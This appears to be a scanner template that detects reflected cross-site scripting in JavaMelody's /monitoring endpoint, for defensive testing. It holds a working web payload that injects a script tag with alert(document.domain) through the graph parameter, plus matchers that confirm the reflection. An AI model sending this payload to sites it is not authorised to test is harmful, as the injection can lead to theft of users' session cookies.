id: java-melody-xss
name: JavaMelody - Cross-Site Scripting
severity: high
confidence: tentative
description: JavaMelody contains a cross-site scripting vulnerability via the monitoring parameter. An attacker can execute
  arbitrary script in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials
  and launch other attacks.
reference: CWE-79
tags:
- xss
- javamelody
- vuln
requests:
- method: GET
  path: /monitoring?part=graph&graph=usedMemory%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
  matchers:
  - type: body
    words:
    - </script><script>alert(document.domain)</script>
  - type: header
    words:
    - text/html
  - type: status
    status:
    - 200
  condition: and
